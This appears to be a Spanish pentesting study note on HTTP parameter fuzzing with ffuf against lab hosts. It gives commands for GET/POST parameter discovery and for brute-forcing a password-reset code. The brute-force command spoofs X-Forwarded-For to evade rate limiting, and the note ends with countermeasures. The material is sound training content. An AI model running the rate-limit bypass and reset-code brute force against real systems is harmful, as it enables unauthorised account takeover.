---
title: Fuzzing de Parámetros HTTP
slug: fuzzing-parametros
aliases: [Fuzzing de Parámetros HTTP]
fase: [Enumeración]
plataforma: Web
dificultad: Intermedia
mitre: [T1595.002]
related: []
learning_refs: []
---

# Fuzzing de Parámetros HTTP

## Descripción
Técnica de descubrimiento de parámetros HTTP ocultos en endpoints web, tanto en peticiones GET (query string) como POST (body). Los parámetros no documentados pueden revelar funcionalidad oculta, configuraciones de debug, vectores de inyección o controles de acceso adicionales. La técnica requiere primero identificar el tamaño de respuesta base (sin parámetro valido) para poder filtrar los falsos positivos. Una variante avanzada es el modo pitchfork de ffuf, que permite rotar IPs para evadir controles de rate-limiting.

## Herramientas
- **ffuf** — fuzzer web; soporta GET, POST, cookies y múltiples wordlists en modo pitchfork

## Comandos / Ejemplos

### Fuzzing de parámetros GET
```bash
# Descubrimiento de parametro GET con filtro de tamano base
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key \
  -fs 985
# -fs 985: filtra respuestas del tamano base (respuesta sin parametro valido)
# Un resultado con tamano distinto indica un parametro valido
```

### Fuzzing de parámetros POST
```bash
# Descubrir nombre del parametro POST
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://admin.academy.htb:PORT/admin/admin.php \
  -X POST \
  -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fs xxx
# Reemplazar xxx con el tamano base de respuesta observado previamente

# Fuzzing del VALOR de un parametro POST conocido (enumeracion de IDs)
ffuf -w ids.txt:FUZZ \
  -u http://admin.academy.htb:PORT/admin/admin.php \
  -X POST \
  -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fs xxx
```

### Modo pitchfork: bypass de rate-limiting vía rotacion de IPs
```bash
# Generar lista de IPs falsas para el header X-Forwarded-For
for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > fake_ip.txt
head -n 1000 fake_ip.txt > fake_ip_cut.txt

# ffuf pitchfork: W1=valor a fuzzear, W2=IP rotante sincronizada
ffuf -w /opt/useful/SecLists/Fuzzing/4-digits-0000-9999.txt:W1 \
  -w fake_ip_cut.txt:W2 \
  -u "http://10.201.99.232:1337/reset_password.php" \
  -X "POST" \
  -d "recovery_code=W1&s=80" \
  -b "PHPSESSID=4u1edcve3va7g5ddtpck97gko4" \
  -H "X-Forwarded-For: W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" \
  -mode pitchfork \
  -v -rate 50
# -mode pitchfork: empareja W1[i] con W2[i] (no combinacion cartesiana)
# -fr "Invalid": filtra respuestas que contienen la cadena "Invalid"
# -rate 50: limitar a 50 req/s para evadir deteccion
```

**Parámetros importantes a buscar:**
- `debug`, `test`, `dev`, `staging` → modos de depuracion
- `id`, `user`, `uid`, `account` → IDOR (Insecure Direct Object Reference)
- `redirect`, `url`, `next`, `return` → Open Redirect
- `file`, `path`, `include`, `page` → LFI/Path Traversal
- `cmd`, `exec`, `command` → RCE

**Estrategia de filtrado:**
1. Hacer una petición sin parámetro → anotar el tamaño de respuesta (ej: 985 bytes)
2. Usar `-fs 985` para filtrar todas las respuestas de ese tamaño
3. Las respuestas con tamaño diferente indican parámetros que cambian el comportamiento

## Contramedidas
- Implementar rate limiting estricto por IP y por sesion en endpoints sensibles
- No confiar en la oscuridad de los parámetros como medida de seguridad
- Validar y sanitizar todos los parámetros de entrada, tanto GET como POST
- Implementar CAPTCHA en flujos criticos (reset de contraseña, registro) para mitigar brute force
- Monitorear el WAF para detectar patrones de fuzzing (muchas peticiones a la misma URL con distintos parámetros)

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1595.002: Active Scanning: Vulnerability Scanning. https://attack.mitre.org/techniques/T1595/002/
- danielmiessler. (s.f.). *SecLists* [Repositorio]. GitHub. https://github.com/danielmiessler/SecLists
- Assetnote. (s.f.). *Wordlists* [Repositorio]. https://wordlists.assetnote.io/
